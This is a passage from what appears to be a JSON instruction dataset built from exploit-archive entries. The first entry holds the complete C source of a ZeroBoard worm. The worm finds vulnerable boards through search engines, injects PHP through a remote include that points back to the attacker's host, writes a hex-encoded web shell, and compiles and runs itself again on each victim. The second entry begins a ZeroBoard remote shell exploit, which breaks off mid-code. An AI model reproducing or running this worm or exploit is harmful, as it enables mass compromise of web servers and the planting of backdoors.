            "Exploit": "/*\nThe worm exploits a vulnerability in ZeroBoard, allowing an attacker to inject arbitrary PHP code.\n\n/str0ke\n*/\n\n/*\n** ZeroBoard -1day INE w0rm\n*/\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <signal.h>\n#include <sys/ioctl.h>\n#include <net/if.h>\n#ifdef __sun__\n#include <sys/sockio.h>\n#endif /* __SunOS__ */\n\n#define DEBUG_ING\n#undef DEBUG_ING\n\n#define TMP_FILE \"./tmp.core\"\n#define CMD_FILE \"./cmd.core\"\n#define PRC_FILE \"./proc.core\"\n#define SCS (0)\n#define MIN (1)\n\n#ifdef __linux__\n#define DEF_ETH \"eth0\"\n#else\n#ifdef __FreeBSD__\n#define DEF_ETH \"ed0\"\n#else\n#ifdef __sun__\n#define DEF_ETH \"hme0\"\n#endif\n#endif\n#endif\n\n#define MAX_BUF (0x0000ffff)\n#define FIR_BUF (0x00000800)\n#define SEC_BUF (0x00000400)\n#define THR_BUF (0x00000200)\n#define MIN_BUF (0x00000100)\n\n#define VENDOR \"nzeo.com\"\n\n// search rule\n#define FD_RULE_0 \"/zboard/zboard.php\"\n#define FD_RULE_1 \"/zb41/zboard.php\"\n#define FD_RULE_2 \"/bbs/zboard.php\"\n#define FD_RULE_3 \"/zb/zboard.php\"\n#define FD_RULE_4 \"/zb40/zboard.php\"\n#define FD_RULE_5 \"/board/zboard.php\"\n#define FD_RULE_6 \"zboard.php\"\n#define FD_RULE_7 \"zboard.ph\"\n\n// pattern\n#define FD_PATH_0 \"/zboard/skin/zero_vote/login.php\"\n#define FD_PATH_1 \"/zb41/skin/zero_vote/login.php\"\n#define FD_PATH_2 \"/bbs/skin/zero_vote/login.php\"\n#define FD_PATH_3 \"/zb/skin/zero_vote/login.php\"\n#define FD_PATH_4 \"/zb40/skin/zero_vote/login.php\"\n#define FD_PATH_5 \"/board/skin/zero_vote/login.php\"\n#define FD_PATH_6 \"/skin/zero_vote/login.php\"\n\n#define RESULT_OK \"200 OK\"\n#define MAKE_STR1 \"BACKDOOR MAKE SUCCESS\"\n#define MAKE_STR2 \"ZBCODE MAKE SUCCESS\"\n#define DELT_STR1 \"BACKDOOR DELETE SUCCESS\"\n#define DELT_STR2 \"ZBCODE DELETE SUCCESS\"\n\n#define DEF_PORT (31337)\n#define CONN_PORT (80)\n#define DEF_TIME (20)\n\nint set_sock(char *sc_gt_host,int port,int type);\nvoid re_connt_lm(int st_sock_va,int type);\nint proc_r();\nvoid t_kill();\nvoid sf_exit();\nint g_ip(char *ip);\nint make_cmd_file();\nint filter_f(char *test_bf,int tnum);\n\nint sock;\n\nstruct tg_rl\n{\n int r_num;\n char *r_str;\n char *url_str;\n};\n\n#define TARGET_NUM (7)\n#define SEARCH_NUM (4)\n\nstruct tg_rl __tg_rule_va[]=\n{\n {0,FD_RULE_0,FD_PATH_0},\n {1,FD_RULE_1,FD_PATH_1},\n {2,FD_RULE_2,FD_PATH_2},\n {3,FD_RULE_3,FD_PATH_3},\n {4,FD_RULE_4,FD_PATH_4},\n {5,FD_RULE_5,FD_PATH_5},\n {6,FD_RULE_6,FD_PATH_6},\n {7,FD_RULE_7,FD_PATH_6},\n {8,NULL,NULL}\n};\n\nstruct search_rule\n{\n int num;\n u_char *url;\n int maxnum;\n int defnum;\n u_char *http_head;\n};\n\nstruct search_rule search_va[]=\n{\n {0,\"www.google.com\",990,10,\"http://\"},\n {1,\"kr.search.yahoo.com\",990,15,\"http://\"},\n {2,\"search.nate.com\",480,10,\"http://\"},\n {3,\"search.lycos.com\",990,10,\"//\"},\n {4,\"kr.altavista.com\",1000,10,\"//\"},\n {5,NULL,0,0,NULL}\n};\n\nvoid t_kill()\n{\n#ifdef DEBUG_ING\n fprintf(stdout,\"time out\\n\");\n#endif\n close(sock);\n sock=-1;\n signal(SIGALRM,SIG_DFL);\n return;\n}\n\nvoid sf_exit()\n{\n#ifdef DEBUG_ING\n fprintf(stdout,\"safe exit\\n\");\n#endif\n close(sock);\n kill((int)proc_r(),9);\n unlink(TMP_FILE);\n unlink(CMD_FILE);\n unlink(PRC_FILE);\n exit(-1);\n}\n\nint main(int argc,char *argv[])\n{\n FILE *fp;\n\n int tnum=(SCS);\n int chk=(SCS);\n int gogo=(SCS);\n int whgl=(SCS);\n int qnum=(SCS);\n int tgrl_sl=(MIN);\n int _conn_num=(SCS);\n int port=(CONN_PORT);\n int def_port=(DEF_PORT);\n int sc_gt_sock;\n int host_chk=(SCS);\n\n u_char *gg_ptr=NULL;\n u_char *t_ptr=NULL;\n u_char __zr_bf[(MAX_BUF)];\n u_char *port_ptr=NULL;\n\n char pkt[(FIR_BUF)];\n char host[(SEC_BUF)];\n char url[(SEC_BUF)];\n char test_bf[(MAX_BUF)];\n char req_t_bf[(THR_BUF)];\n char ip[(MIN_BUF)];\n char atk_code[(MIN_BUF)];\n\n signal(SIGINT,sf_exit);\n signal(SIGTSTP,sf_exit);\n\n while((whgl=getopt(argc,argv,\"S:s:T:t:Q:q:P:p:H:h:U:u:\"))!=EOF)\n {\n  extern char *optarg;\n  switch(whgl)\n  {\n   case 'S':\n   case 's':\n    tnum=atoi(optarg);\n    if(SEARCH_NUM<tnum)\n    {\n     fprintf(stderr,\"target error\\n\");\n     exit(-1);\n    }\n    break;\n\n   case 'T':\n   case 't':\n    tgrl_sl=atoi(optarg);\n    if(TARGET_NUM<tgrl_sl)\n    {\n     fprintf(stderr,\"target error\\n\");\n     exit(-1);\n    }\n    break;\n\n   case 'Q':\n   case 'q':\n    qnum=atoi(optarg);\n    break;\n\n   case 'P':\n   case 'p':\n    def_port=atoi(optarg);\n    break;\n\n   case 'H':\n   case 'h':\n    memset((char *)host,0,sizeof(host));\n    strncpy(host,optarg,sizeof(host)-1);\n    host_chk++;\n    break;\n\n   case 'U':\n   case 'u':\n    memset((char *)url,0,sizeof(url));\n    strncpy(url,optarg,sizeof(url)-1);\n    host_chk++;\n    break;\n\n   default:\n    exit(-1);\n  }\n }\n\n (int)make_cmd_file();\n\n if(fork()==0)\n {\n  signal(SIGALRM,SIG_IGN);\n  for(whgl=0;whgl<argc;whgl++)\n  {\n   memset((char *)argv[whgl],0,strlen(argv[whgl]));\n  }\n  strcpy(argv[0],\"receive mode process\");\n  if((fp=fopen(PRC_FILE,\"w\"))==NULL)\n  {\n   sf_exit();\n  }\n  fprintf(fp,\"%d\\n\",getpid());\n  fclose(fp);\n  sc_gt_sock=(int)set_sock(NULL,def_port,1);\n  (void)re_connt_lm(sc_gt_sock,0);\n }\n else\n {\n  for(whgl=0;whgl<argc;whgl++)\n  {\n   memset((char *)argv[whgl],0,strlen(argv[whgl]));\n  }\n  strcpy(argv[0],\"scanning mode process\");\n\n  switch(host_chk)\n  {\n   case 1:\n#ifdef DEBUG_ING\n    fprintf(stdout,\"argument error\\n\");\n#endif\n    sf_exit();\n    break;\n\n   case 2:\n    goto ok;\n    break;\n  }\n\n#ifdef DEBUG_ING\n  fprintf(stdout,\"search url: %s\\n\",search_va[tnum].url);\n#endif\n  for(_conn_num=qnum; _conn_num< search_va[tnum].maxnum; _conn_num += (search_va[tnum].defnum))\n  {\nconn: if((sock=(int)set_sock(search_va[tnum].url,(CONN_PORT),0))==-1)\n   {\n    goto conn;\n   }\n\n   memset((char *)req_t_bf,0,sizeof(req_t_bf));\n   switch(search_va[tnum].num)\n   {\n    case 0:\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\n      \"GET /search?q=%s\"\n      \"&hl=ko&lr=&ie=UTF-8&start=%d&sa=N \"\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\n     break;\n    case 1:\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\n      \"GET /search/web?p=%s&b=%d \"\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\n     break;\n    case 2:\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\n      \"GET /webpage/search.asp?query=%s&start=%d \"\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\n     break;\n    case 3:\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\n      \"GET /default.asp?query=%s&first=%d&pmore=more \"\n      \"HTTP/1.0\\r\\n\"\n      \"Accept-Language: ko\\r\\n\"\n      \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\\r\\n\"\n      \"Host: %s\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);\n     break;\n    case 4:\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\n      \"GET /web/results?itag=wrx&q=%s&stq=%d \"\n      \"HTTP/1.0\\r\\n\"\n      \"Accept-Language: ko\\r\\n\"\n      \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\\r\\n\"\n      \"Host: %s\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);\n     break;\n   }\n   send(sock,req_t_bf,strlen(req_t_bf),0);\n   whgl=(SCS);\n\n   if((fp=fopen(TMP_FILE,\"w\"))==NULL)\n   {\n    return(-1);\n   }\n   signal(SIGALRM,SIG_IGN);\n   alarm(MAX_BUF);\n\n   memset((char *)test_bf,0,sizeof(test_bf));\n   while(recv(sock,test_bf,sizeof(test_bf)-1,0))\n   {\n    fprintf(fp,\"%s\",test_bf);\n    memset((char *)test_bf,0,sizeof(test_bf));\n   }\n   fclose(fp);\n   close(sock);\n\n   if((fp=fopen(TMP_FILE,\"r\"))==NULL)\n   {\n    return(-1);\n   }\n\n   while(fgets(__zr_bf,sizeof(__zr_bf)-1,fp))\n   {\n    gg_ptr=__zr_bf;\n\n    while(MIN)\n    {\n     t_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head);\n     gg_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\n\n     if(t_ptr!=NULL)\n     {\n      memset((char *)test_bf,0,sizeof(test_bf));\n      whgl=(SCS);\n      chk=(SCS);\n\n      for(gogo=0;gogo<strlen(t_ptr);gogo++)\n      {\n       if(chk)\n       {\n        if(t_ptr[gogo]=='>')\n         chk=0;\n       }\n       else {\n        if(t_ptr[gogo]==' ')\n         continue;\n        else if(t_ptr[gogo]=='<')\n         chk=1;\n        else test_bf[whgl++]=t_ptr[gogo];\n       }\n      }\n\n      if(!strstr(test_bf,__tg_rule_va[tgrl_sl].r_str))\n       continue;\n      else t_ptr=(char *)strstr(test_bf,__tg_rule_va[tgrl_sl].r_str);\n\n      if(t_ptr!=NULL)\n       t_ptr[0]='\\0';\n      else continue;\n\n      if(filter_f(test_bf,tnum))\n      {\n       t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\n       if(strstr(t_ptr,search_va[tnum].http_head))\n        continue;\n\n       memset((char *)host,0,sizeof(host));\n       memset((char *)url,0,sizeof(url));\n\n       chk=(SCS);\n\n       if(strstr(test_bf,search_va[tnum].http_head))\n       {\n        t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\n        port=(CONN_PORT);\n\n        for(whgl=0;whgl<strlen(t_ptr)+1;whgl++)\n        {\n         if(t_ptr[whgl]=='/')\n         {\n          for(gogo=0;whgl<strlen(t_ptr);whgl++)\n           url[gogo++]=t_ptr[whgl];\n          strcat(url,__tg_rule_va[tgrl_sl].url_str);\n          break;\n         }\n         else if(t_ptr[whgl]=='\\0')\n         {\n          strncpy(url,__tg_rule_va[tgrl_sl].url_str,sizeof(url)-1);\n          break;\n         }\n         else if(t_ptr[whgl]==':')\n         {\n          port_ptr=(char *)strstr(t_ptr,\":\")+1;\n          port=atoi(port_ptr);\n         }\n         else host[chk++]=t_ptr[whgl];\n        }\n#ifdef DEBUG_ING\n        fprintf(stdout,\"Total:%s,URL:%s,HOST:%s,PORT:%d\\n\",test_bf,url,host,port);\n#endif\nok:\n        sock=set_sock(host,port,0);\n        if(sock==-1)\n         continue;\n        else {\n         memset((char *)ip,0,sizeof(ip));\n         memset((char *)atk_code,0,sizeof(atk_code));\n         memset((char *)pkt,0,sizeof(pkt));\n\n         (int)g_ip(ip);\n         snprintf(atk_code,sizeof(atk_code)-1,\"dir=http://%s:%d/\\r\\n\",ip,def_port);\n         snprintf(pkt,sizeof(pkt)-1,\n          \"POST http://%s%s HTTP/1.0\\r\\n\"\n          \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n          \"Content-Length: %d\\r\\n\"\n          \"Host: %s\\r\\n\\r\\n%s\\r\\n\",host,url,strlen(atk_code),host,atk_code);\n         send(sock,pkt,strlen(pkt),0);\n         memset((char *)pkt,0,sizeof(pkt));\n         recv(sock,pkt,sizeof(pkt)-1,0);\n#ifdef DEBUG_ING\n         if(strstr(pkt,RESULT_OK))\n         {\n          if(strstr(pkt,MAKE_STR1))\n           fprintf(stdout,\"%s\\n\",MAKE_STR1);\n          if(strstr(pkt,MAKE_STR2))\n           fprintf(stdout,\"%s\\n\",MAKE_STR2);\n          if(strstr(pkt,DELT_STR1))\n           fprintf(stdout,\"%s\\n\",DELT_STR1);\n          if(strstr(pkt,DELT_STR2))\n           fprintf(stdout,\"%s\\n\",DELT_STR2);\n          printf(\"%s: %s\\n\",RESULT_OK,host);\n         }\n#endif\n        }\n        close(sock);\n\n        if(host_chk)\n        {\n         sf_exit();\n        }\n       }\n      }\n     }\n     else break;\n    }\n    memset((char *)__zr_bf,0,sizeof(__zr_bf));\n   }\n   fclose(fp);\n   unlink(TMP_FILE);\n  }\n  sf_exit();\n }\n}\n\nint set_sock(char *sc_gt_host,int port,int type)\n{\n struct sockaddr_in sock_st;\n struct sockaddr_in t_st;\n int nw_gt_sock,s_s;\n struct hostent *hst_etr;\n int sc_gt_sock;\n int t_c=0;\n char t_b[(SEC_BUF)];\n FILE *fp;\n char http_rq[]=\"HTTP/1.1 200 OK\\r\\n\\r\\n\";\n\n if(!type){\n  signal(SIGALRM,t_kill);\n  alarm(DEF_TIME);\n\n  if((hst_etr=gethostbyname(sc_gt_host))==NULL)\n  {\n   return(-1);\n  }\n  if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\n  {\n   return(-1);\n  }\n  sock_st.sin_family=(AF_INET);\n  sock_st.sin_port=htons(port);\n  sock_st.sin_addr=*((struct in_addr *)hst_etr->h_addr);\n  memset(&(sock_st.sin_zero),0,8);\n\n  if(connect(sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)\n  {\n   close(sock);\n   return(-1);\n  }\n  return(sock);\n }\n else{\n  if((sc_gt_sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\n  {\n   return(-1);\n  }\n\n  sock_st.sin_family=(AF_INET);\n  sock_st.sin_port=htons(port);\n  sock_st.sin_addr.s_addr=(INADDR_ANY);\n  memset(&(sock_st.sin_zero),0,8);\n\n  if(bind(sc_gt_sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)\n  {\n   close(sc_gt_sock);\n   return(-1);\n  }\n#define BK_LG 10\n  if(listen(sc_gt_sock,(BK_LG))==-1){\n   close(sc_gt_sock);\n   return(-1);\n  }\n  while(1){\n   s_s=sizeof(struct sockaddr_in);\n   if((nw_gt_sock=accept(sc_gt_sock,(struct sockaddr *)&t_st,&s_s))==-1)\n   {\n    close(nw_gt_sock);\n    close(sc_gt_sock);\n    return(-1);\n   }\n   while(recv(nw_gt_sock,&t_c,1,0)){\n    if(t_c==0x0d){\n     recv(nw_gt_sock,&t_c,1,0);\n     if(t_c==0x0a){\n      recv(nw_gt_sock,&t_c,1,0);\n      if(t_c==0x0d){\n       recv(nw_gt_sock,&t_c,1,0);\n       if(t_c==0x0a){\n        break;\n       }\n      }\n     }\n    }\n   }\n\n   send(nw_gt_sock,http_rq,strlen(http_rq),0);\n   if((fp=fopen(CMD_FILE,\"r\"))==NULL){\n    close(nw_gt_sock);\n    close(sc_gt_sock);\n    return(-1);\n   }\n   memset((char *)t_b,0,sizeof(t_b));\n   while(fgets(t_b,sizeof(t_b)-1,fp)){\n    send(nw_gt_sock,t_b,strlen(t_b),0);\n   }\n   fclose(fp);\n   close(nw_gt_sock);\n   continue;\n  }\n  close(sc_gt_sock);\n  return(-1);\n }\n}\n\nvoid re_connt_lm(int st_sock_va,int type)\n{\n if(st_sock_va==-1)\n {\n  if(!type){\n   kill(getppid(),9); // parent\n  }\n  kill((int)proc_r(),9); // child\n  sf_exit();\n }\n}\n\nint proc_r(){\n FILE *fp;\n int proc_n;\n if((fp=fopen(PRC_FILE,\"r\"))==NULL){\n  exit(-1); // child check.\n }\n fscanf(fp,\"%16d\",&proc_n);\n fclose(fp);\n return proc_n;\n}\n\nint g_ip(char *ip)\n{\n int sock;\n struct ifreq ifpq;\n struct sockaddr_in *pq;\n\n memset(&ifpq,0,sizeof(ifpq));\n if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\n {\n  return(-1);\n }\n pq=(struct sockaddr_in *)&ifpq.ifr_addr;\n pq->sin_family=AF_INET;\n\n memcpy(ifpq.ifr_name,(DEF_ETH),sizeof(ifpq.ifr_name));\n if(ioctl(sock,SIOCGIFADDR,&ifpq)==0)\n {\n  memset((char *)ip,0,(MIN_BUF));\n  snprintf(ip,(MIN_BUF)-1,\"%s\",inet_ntoa(pq->sin_addr));\n }\n return 0;\n}\n\n#define BACKDOOR_PATH \"zblog.php\"\n#define CODE_PATH \"zbcode\"\n#define CODE_PATH_SRC \"zbcode.c\"\n\nint make_cmd_file()\n{\n unsigned long w1=0;\n FILE *fp;\n FILE *pf;\n\n if((fp=fopen(CMD_FILE,\"w\"))==NULL)\n {\n  return(-1);\n }\n\n fprintf(fp,\"<?\\n\"\n  \"chdir('../../');\\n\\n\"\n  \"if(($fp=fopen('%s','r'))!=NULL)\\n\"\n  \"{\\n\"\n  \"$pnum=fread($fp,32);\\n\"\n  \"fclose($fp);\\n\"\n  \"$pnum=str_replace(\\\"\\\\n\\\",\\\"\\\",$pnum);\\n\"\n  \"if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\\n\"\n  \"{\\n\"\n  \"exit;\\n\"\n  \"}\\n\"\n  \"}\\n\\n\"\n  \"$cont=\\\"\\\\x3c\\\\x3f\\\\x0a\\\\x09\\\\x65\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x27\\\\x3c\\\\x46\\\".\\n\"\n  \"\\\"\\\\x4f\\\\x52\\\\x4d\\\\x20\\\\x41\\\\x43\\\\x54\\\\x49\\\\x4f\\\\x4e\\\\x3d\\\\x24\\\".\\n\"\n  \"\\\"\\\\x50\\\\x48\\\\x50\\\\x5f\\\\x53\\\\x45\\\\x4c\\\\x46\\\\x20\\\\x4d\\\\x45\\\\x54\\\".\\n\"\n  \"\\\"\\\\x48\\\\x4f\\\\x44\\\\x3d\\\\x50\\\\x4f\\\\x53\\\\x54\\\\x3e\\\\x27\\\\x3b\\\\x0a\\\".\\n\"\n  \"\\\"\\\\x09\\\\x65\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x27\\\\x3c\\\\x49\\\\x4e\\\\x50\\\\x55\\\".\\n\"\n  \"\\\"\\\\x54\\\\x20\\\\x54\\\\x59\\\\x50\\\\x45\\\\x3d\\\\x48\\\\x49\\\\x44\\\\x44\\\\x45\\\".\\n\"\n  \"\\\"\\\\x4e\\\\x20\\\\x4e\\\\x41\\\\x4d\\\\x45\\\\x3d\\\\x63\\\\x6d\\\\x64\\\\x20\\\\x56\\\".\\n\"\n  \"\\\"\\\\x41\\\\x4c\\\\x55\\\\x45\\\\x3d\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\".\\n\"\n  \"\\\"\\\\x64\\\\x3e\\\\x3c\\\\x2f\\\\x46\\\\x4f\\\\x52\\\\x4d\\\\x3e\\\\x3c\\\\x50\\\\x52\\\".\\n\"\n  \"\\\"\\\\x45\\\\x3e\\\\x27\\\\x3b\\\\x0a\\\\x09\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\".\\n\"\n  \"\\\"\\\\x6e\\\\x64\\\\x3d\\\\x73\\\\x74\\\\x72\\\\x5f\\\\x72\\\\x65\\\\x70\\\\x6c\\\\x61\\\".\\n\"\n  \"\\\"\\\\x63\\\\x65\\\\x28\\\\x27\\\\x5c\\\\x5c\\\\x27\\\\x2c\\\\x27\\\\x27\\\\x2c\\\\x24\\\".\\n\"\n  \"\\\"\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\\x64\\\\x29\\\\x3b\\\\x0a\\\\x09\\\\x65\\\".\\n\"\n  \"\\\"\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x60\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\".\\n\"\n  \"\\\"\\\\x64\\\\x60\\\\x3b\\\\x0a\\\\x3f\\\\x3e\\\\x0a\\\";\\n\\n\"\n  \"$fp=fopen('%s','w');\\n\"\n  \"fputs($fp,$cont);\\n\"\n  \"fclose($fp);\\n\\n\",PRC_FILE,BACKDOOR_PATH);\n\n if((pf=fopen(CODE_PATH,\"r\"))==NULL)\n {\n  return(-1);\n }\n\n fprintf(fp,\"$cont=\\\"\");\n while(fread(&w1,1,1,pf))\n {\n  fprintf(fp,\"\\\\x%02x\",w1);\n }\n fclose(pf);\n fprintf(fp,\"\\\";\\n\\n\");\n\n fprintf(fp,\"$fp=fopen('%s','w');\\n\"\n  \"fputs($fp,$cont);\\n\"\n  \"fclose($fp);\\n\\n\",CODE_PATH);\n if((pf=fopen(CODE_PATH_SRC,\"r\"))==NULL)\n {\n  return(-1);\n }\n fprintf(fp,\"$cont=\\\"\");\n while(fread(&w1,1,1,pf))\n {\n  fprintf(fp,\"\\\\x%02x\",w1);\n }\n fclose(pf);\n fprintf(fp,\"\\\";\\n\\n\");\n\n fprintf(fp,\"$fp=fopen('%s','w');\\n\"\n  \"fputs($fp,$cont);\\n\"\n  \"fclose($fp);\\n\\n\",CODE_PATH_SRC);\n fprintf(fp,\"$RES=`gcc -o %s %s`;\\n\\n\",CODE_PATH,CODE_PATH_SRC);\n\n fprintf(fp,\"chmod('%s',0755);\\n\",CODE_PATH);\n\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL){\\n\",BACKDOOR_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",MAKE_STR1);\n fprintf(fp,\"} fclose($fp);\\n\\n\");\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL){\\n\",CODE_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",MAKE_STR2);\n fprintf(fp,\"} fclose($fp);\\n\\n\");\n\n#if 1\n fprintf(fp,\"$fnum=(rand()%%%d);\\n\",TARGET_NUM);\n fprintf(fp,\"$snum=(rand()%%%d);\\n\",SEARCH_NUM);\n fprintf(fp,\"$randnum=(rand()%400);\\n\");\n\n fprintf(fp,\"while(1)\\n{\\n\");\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL)\\n\"\n  \"{\\n\"\n  \"$pnum=fread($fp,32);\\n\"\n  \"fclose($fp);\\n\"\n  \"$pnum=str_replace(\\\"\\\\n\\\",\\\"\\\",$pnum);\\n\"\n  \"if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\\n\"\n  \"{\\n\"\n  \"exit;\\n\"\n  \"}\\n\"\n  \"}\\n\\n\",PRC_FILE);\n\n fprintf(fp,\"$port=(rand()%%65500);\\n\");\n fprintf(fp,\"if($port>1024){\\n\");\n fprintf(fp,\"exec(\\\"./%s -t $fnum -p $port -s $snum -q $randnum\\\");\\n\",CODE_PATH);\n fprintf(fp,\"}\\n}\\n\");\n#else\n fprintf(fp,\"unlink('%s');\\n\",BACKDOOR_PATH);\n fprintf(fp,\"unlink('%s');\\n\",CODE_PATH);\n\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",BACKDOOR_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR1);\n fprintf(fp,\"} else { fclose($fp);\\n\");\n fprintf(fp,\"$result=`rm -f %s`;\\n$result=`del %s`;\\n\",BACKDOOR_PATH,BACKDOOR_PATH);\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",BACKDOOR_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR1);\n fprintf(fp,\"}\\n}\\n\");\n\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",CODE_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR2);\n fprintf(fp,\"} else { fclose($fp);\\n\");\n fprintf(fp,\"$result=`rm -f %s`;\\n$result=`del %s`;\\n\",CODE_PATH,CODE_PATH);\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",CODE_PATH);\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR2);\n fprintf(fp,\"}\\n}\\n\");\n#endif\n fprintf(fp,\"?>\\n\");\n fclose(fp);\n}\n\nint filter_f(char *test_bf,int tnum)\n{\n switch(search_va[tnum].num)\n {\n  case 0: /* google */\n   if(!strstr(test_bf,\"google\")&&!strstr(test_bf,\"/search?q=cache:\")\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\n    &&!strstr(test_bf,\"%3F\")&&!strstr(test_bf,\"...\")\n    &&!strstr(test_bf,VENDOR))\n   {\n    return 1;\n   }\n   else return 0;\n   break;\n\n  case 1: /* yahoo */\n   if(!strstr(test_bf,\"yahoo\")&&!strstr(test_bf,\"/cache.php?\")\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\n    &&!strstr(test_bf,\"search\")&&!strstr(test_bf,\".html%\")\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\n   {\n    return 1;\n   }\n   else return 0;\n   break;\n\n  case 2: /* nate */\n   if(!strstr(test_bf,\"nate\")&&!strstr(test_bf,\"RESULT\")\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\n    &&!strstr(test_bf,\"/search/\")&&!strstr(test_bf,\"%3F\")\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\n   {\n    return 1;\n   }\n   else return 0;\n   break;\n\n  case 3: /* lycos */\n   if(!strstr(test_bf,\"lycos\")&&!strstr(test_bf,\"<\")\n    &&!strstr(test_bf,\">\")&&!strstr(test_bf,\"%3F\")\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\n   {\n    return 1;\n   }\n   else return 0;\n   break;\n\n  case 4: /* altavista */\n   if(!strstr(test_bf,\"ref_\")&&!strstr(test_bf,\"<\")\n    &&!strstr(test_bf,\">\")&&!strstr(test_bf,\"%3f\")\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\n   {\n    return 1;\n   }\n   else return 0;\n   break;\n\n  default:\n   return 0;\n   break;\n }\n return 0;\n}\n\n// milw0rm.com [2005-05-06]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 1020",
        "output": {
            "ID": "1020",
            "File": "exploits/php/webapps/1020.c",
            "Description": "ZeroBoard 4.1 - 'preg_replace' Remote Nobody Shell",
            "Date Published": "2005-05-31",
            "Author": "n0gada",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-05-30",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-16996;CVE-2005-1820"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "http://pandora.sapzil.info/text/notify/20050123.zb41advisory.php",
            "Exploit": "/*\n*\n----------------------------------------------------------------------------------\n[+] Zeroboard preg_replace vulnerability Remote nobody shell exploit\n----------------------------------------------------------------------------------\n\n> by n0gada (n0gada@null2root.org)\n\n[*] date : 2005/5/29\n\n[*] the bug\n\nOriginal advisory:\n- http://pandora.sapzil.info/text/notify/20050123.zb41advisory.php\n\nApplication\n- Zeroboard 4.1 pl2 - 4.1 pl5\n\nReference:\n- http://www.nzeo.com\n\n[*] Target - My test server\n\n$ ./zbexpl http://xxx.xxx.xxx/zboard/zboard.php?id=test\n- Target : http://xxx.xxx.xxx/zboard/zboard.php?id=test\n\n[+] xxx.xxx.xxx connecting ok!\n[+] Zeroboard writing . ok!\n[+] Confirmming your article - found!\n[+] Exploiting zeroboard start ............................... Done!\n[*] Confirmming your backdoor php script -\nhttp://xxx.xxx.xxx/zboard/data/test/shell.php is generated!\n[+] Exploiting success!!\n[*] Remove your article - ok! :)\n\n------------------------------------------------------------------------------\n*\n*/\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <netdb.h>\n#include <sys/types.h>\n#include <signal.h>\n#include <time.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/select.h>\n#include <errno.h>\n\n\n#define BUFSIZE 4096\n#define READSIZE 1500\n\nvoid ParseZbHost(char *);\nvoid ConnectZboard(char *, unsigned short);\nvoid WriteZboard(void);\nvoid ExploitZboard(void);\nvoid ConfirmPHPScript(void);\nvoid DeleteArticle(void);\nvoid StatusProcess(void);\nvoid Usage(char *);\nvoid OutputErr(char *, int);\n\nchar *zb_host;\nchar *zb_dir;\nchar 